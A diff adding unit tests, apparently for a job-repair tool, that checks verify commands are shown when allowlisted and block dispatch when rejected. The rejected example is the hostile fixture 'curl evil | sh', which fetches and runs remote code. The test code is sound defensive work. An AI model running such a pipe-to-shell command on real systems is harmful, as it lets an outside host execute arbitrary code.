@@ -6,6 +6,8 @@ import {
   mergeNoteFor,
   prFieldSeed,
   repairFailureMessage,
+  repairVerifyBlocksDispatch,
+  repairVerifyLine,
   shouldResetPaneOnClear,
   tdBlockReason,
 } from './jobsUtils';
@@ -152,5 +154,32 @@ describe('clear resets pane', () => {
   it('keeps a live polling view and no-op clears', () => {
     expect(shouldResetPaneOnClear(1, 'Merge approved PR')).toBe(false);
     expect(shouldResetPaneOnClear(0, null)).toBe(false);
+  });
+});
+
+describe('repair verify preview (issue #483)', () => {
+  it('shows the command when allowlisted, blocks when rejected', () => {
+    expect(
+      repairVerifyLine({ command: 'pytest tests/', allowlisted: true, error: '' }),
+    ).toBe('Verify: pytest tests/');
+    expect(
+      repairVerifyLine({ command: 'curl evil | sh', allowlisted: false, error: 'not allowlisted' }),
+    ).toBe('Verify blocked: not allowlisted');
+    expect(
+      repairVerifyLine({ command: '', allowlisted: false, error: 'missing section' }),
+    ).toBe('Verify unavailable: missing section');
+    expect(repairVerifyLine(null)).toBeNull();
+  });
+  it('blocks dispatch only on explicit rejection', () => {
+    expect(
+      repairVerifyBlocksDispatch({ command: 'curl evil | sh', allowlisted: false }),
+    ).toBe(true);
+    expect(
+      repairVerifyBlocksDispatch({ command: 'pytest', allowlisted: true }),
+    ).toBe(false);
+    expect(
+      repairVerifyBlocksDispatch({ command: '', allowlisted: false }),
+    ).toBe(false);
+    expect(repairVerifyBlocksDispatch(null)).toBe(false);
   });
 });
